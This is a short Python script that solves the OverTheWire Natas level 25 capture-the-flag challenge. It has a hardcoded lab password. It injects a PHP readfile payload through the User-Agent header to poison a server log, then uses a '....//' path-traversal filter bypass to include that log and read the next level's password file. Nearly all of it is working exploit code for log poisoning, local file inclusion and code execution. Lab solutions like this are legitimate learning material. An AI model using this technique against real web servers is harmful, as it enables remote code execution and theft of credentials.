import requests, string

target = 'http://natas25.natas.labs.overthewire.org'
auth = ('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')

cookies = dict()
# this forces the application to call logRequest() function
# this put contents of "/etc/natas_webpass/natas26" in each log entry
headers = {
	"User-Agent": '<?php readfile("/etc/natas_webpass/natas26"); ?>'
}

# executes a first request to get the session id
r = requests.get(target, auth=auth, cookies=cookies, headers=headers)

phpsessid = r.cookies['PHPSESSID']
log_file = 'var/www/natas/natas25/logs/natas25_%s.log' % phpsessid
cookies = dict(PHPSESSID=phpsessid)

# "..././" is escaped to "../", we'll exploit it reach log_file
params = dict(lang=('....//....//....//....//....//....//' + log_file))
r = requests.get(target, auth=auth, params=params, cookies=cookies, headers=headers)
print(r.text)
